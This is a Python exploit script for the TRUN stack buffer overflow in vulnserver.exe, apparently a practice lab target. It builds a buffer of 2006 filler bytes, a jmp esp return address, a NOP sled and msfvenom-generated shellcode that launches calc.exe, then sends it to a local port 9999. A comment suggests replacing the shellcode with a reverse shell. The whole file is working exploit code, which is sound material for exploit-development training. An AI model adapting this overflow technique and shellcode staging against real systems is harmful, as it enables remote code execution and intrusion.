import socket
from struct import pack

"""
    vulnserver.exe - stack overflow TRUN
"""

def sendBuffer(ip, port, buf):
    try:
        print("[*] - Attempting to send buffer \n")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(buf)
        s.recv(1024)
        s.close()
        print("[*] - Buffer sent")
    except Exception as e:
        print(str(e))

def main():
    ip = "127.0.0.1"
    port = 9999

    """
    eip = 2006
    jmp esp = 625011af  
    """

    # msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f py -v shellcode EXITFUNC=thread
    # Could update this to reverse shell if needed.
    shellcode =  b""
    shellcode += b"\xda\xcf\xba\x21\x5c\xbc\x44\xd9\x74\x24\xf4"
    shellcode += b"\x58\x31\xc9\xb1\x31\x31\x50\x18\x83\xc0\x04"
    shellcode += b"\x03\x50\x35\xbe\x49\xb8\xdd\xbc\xb2\x41\x1d"
    shellcode += b"\xa1\x3b\xa4\x2c\xe1\x58\xac\x1e\xd1\x2b\xe0"
    shellcode += b"\x92\x9a\x7e\x11\x21\xee\x56\x16\x82\x45\x81"
    shellcode += b"\x19\x13\xf5\xf1\x38\x97\x04\x26\x9b\xa6\xc6"
    shellcode += b"\x3b\xda\xef\x3b\xb1\x8e\xb8\x30\x64\x3f\xcd"
    shellcode += b"\x0d\xb5\xb4\x9d\x80\xbd\x29\x55\xa2\xec\xff"
    shellcode += b"\xee\xfd\x2e\x01\x23\x76\x67\x19\x20\xb3\x31"
    shellcode += b"\x92\x92\x4f\xc0\x72\xeb\xb0\x6f\xbb\xc4\x42"
    shellcode += b"\x71\xfb\xe2\xbc\x04\xf5\x11\x40\x1f\xc2\x68"
    shellcode += b"\x9e\xaa\xd1\xca\x55\x0c\x3e\xeb\xba\xcb\xb5"
    shellcode += b"\xe7\x77\x9f\x92\xeb\x86\x4c\xa9\x17\x02\x73"
    shellcode += b"\x7e\x9e\x50\x50\x5a\xfb\x03\xf9\xfb\xa1\xe2"
    shellcode += b"\x06\x1b\x0a\x5a\xa3\x57\xa6\x8f\xde\x35\xac"
    shellcode += b"\x4e\x6c\x40\x82\x51\x6e\x4b\xb2\x39\x5f\xc0"
    shellcode += b"\x5d\x3d\x60\x03\x1a\xa1\x82\x86\x56\x4a\x1b"
    shellcode += b"\x43\xdb\x17\x9c\xb9\x1f\x2e\x1f\x48\xdf\xd5"
    shellcode += b"\x3f\x39\xda\x92\x87\xd1\x96\x8b\x6d\xd6\x05"
    shellcode += b"\xab\xa7\xb5\xc8\x3f\x2b\x14\x6f\xb8\xce\x68"
    size = 4096
    prefix = b"TRUN ."
    nopsled = b"\x90" * 100
    inputBuffer = prefix
    inputBuffer+= b"\x41" * 2006
    inputBuffer+= pack("<L", (0x625011af)) # jmp esp
    inputBuffer+= nopsled
    inputBuffer+= shellcode
    inputBuffer+= b"\x43" * (size - len(inputBuffer) - len(shellcode)) # filler
    sendBuffer(ip, int(port), inputBuffer)

if __name__ == '__main__':
    main()